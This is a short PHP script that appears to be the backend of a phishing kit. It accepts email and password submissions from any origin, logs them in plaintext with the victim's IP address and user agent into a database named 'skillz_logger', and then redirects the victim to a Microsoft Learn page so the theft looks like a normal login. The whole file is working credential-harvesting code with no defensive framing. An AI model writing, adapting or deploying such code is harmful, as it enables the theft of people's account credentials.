<?php
    // 1. Allow CORS for all origins
    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type");

    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        exit; // Handle CORS preflight
    }

    // 2. Capture form-data fields
    $email = isset($_POST['email']) ? $_POST['email'] : null;
    $password = isset($_POST['password']) ? $_POST['password'] : null;

    // Capture the real IP (supports proxies, Cloudflare, etc.)
    function getClientIP() {
        $keys = [
            'HTTP_CF_CONNECTING_IP', // Cloudflare
            'HTTP_X_FORWARDED_FOR',  // Proxy / load balancer
            'HTTP_X_REAL_IP',
            'HTTP_CLIENT_IP',
            'REMOTE_ADDR'
        ];
        
        foreach ($keys as $key) {
            if (!empty($_SERVER[$key])) {
                // If multiple IPs exist, take the first one
                return explode(',', $_SERVER[$key])[0];
            }
        }

        return 'UNKNOWN';
    }

    $client_ip = getClientIP();
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';

    if (!$email || !$password) {
        die("Missing email or password");
    }

    // 3. Basic MySQLi connection
    $servername = "127.0.0.1";
    $username   = "root";
    $dbpassword = ""; 
    $dbname     = "skillz_logger";

    $conn = new mysqli($servername, $username, $dbpassword, $dbname);

    if ($conn->connect_error) {
        die("Database connection failed: " . $conn->connect_error);
    }

    // 4. Save into `users` table
    // Insert email, password, and IP
    $stmt = $conn->prepare("INSERT INTO users (email, password, ip_address, user_agent) VALUES (?, ?, ?, ?)");
    $stmt->bind_param("ssss", $email, $password, $client_ip, $user_agent);

    if (!$stmt->execute()) {
        die("Insert failed: " . $stmt->error);
    }

    $stmt->close();
    $conn->close();

    // 5. Random redirect
    // $links = [
    //     "https://google.com",
    //     "https://youtube.com",
    //     "https://facebook.com",
    //     "https://openai.com",
    //     "https://twitter.com"
    // ];

    // $randomUrl = $links[array_rand($links)];

    header("Location: https://learn.microsoft.com/en-us/unknown");
    exit();
?>
